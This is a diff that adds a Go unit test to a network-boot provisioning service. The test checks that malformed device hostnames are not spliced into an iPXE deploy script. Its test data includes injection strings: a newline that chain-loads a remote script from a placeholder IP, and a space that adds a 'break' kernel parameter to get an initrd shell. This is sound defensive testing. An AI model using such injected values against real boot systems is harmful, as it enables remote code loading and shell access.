@@ -595,6 +595,42 @@ func TestDeployBootScript_TailscaleHostnameRequiresKey(t *testing.T) {
 	}
 }
 
+// TestDeployBootScript_TailscaleHostnameNotAHostname: the tailnet hostname
+// is derived from the NetBox device name, which NetBox stores as free text.
+// Spliced into the iPXE script, a newline in it adds an iPXE command (here a
+// chain-load of another script) and a space splits it into extra kernel
+// parameters (here initramfs-tools' "break", which stops the deploy initrd
+// at a shell). A value that is not a valid hostname must not reach the
+// script: the handler emits neither tailscale token, so the agent skips
+// enrollment, and the rest of the deploy cmdline is unchanged.
+func TestDeployBootScript_TailscaleHostnameNotAHostname(t *testing.T) {
+	for _, hostname := range []string{
+		"web1\nchain http://203.0.113.9/x.ipxe-pop2",
+		"web1 break x-pop2",
+		"web1-${net0/mac}-pop2",
+	} {
+		raw, err := json.Marshal(model.OpParams{
+			Destructive: true,
+			TailscaleRuntime: &model.TailscaleRuntime{
+				AuthKey: "tskey-auth-K9", Hostname: hostname, Tags: []string{"tag:pop2"},
+			},
+		})
+		if err != nil {
+			t.Fatal(err)
+		}
+		body := deployScriptFor(t, string(raw), nil)
+		if !strings.Contains(body, " slagworks.destructive") {
+			t.Fatalf("hostname %q: expected a deploy script, got:\n%s", hostname, body)
+		}
+		if strings.Contains(body, hostname) {
+			t.Errorf("hostname %q was spliced into the deploy boot script:\n%s", hostname, body)
+		}
+		if strings.Contains(body, "slagworks.tailscale_") {
+			t.Errorf("hostname %q: expected no tailscale tokens (enrollment skipped), got:\n%s", hostname, body)
+		}
+	}
+}
+
 func TestCommissionBootScript_ContainsTraceID(t *testing.T) {
 	p := newTestProviderKnownMAC()
 	machineID, _ := p.MachineIDForMAC(testMAC)
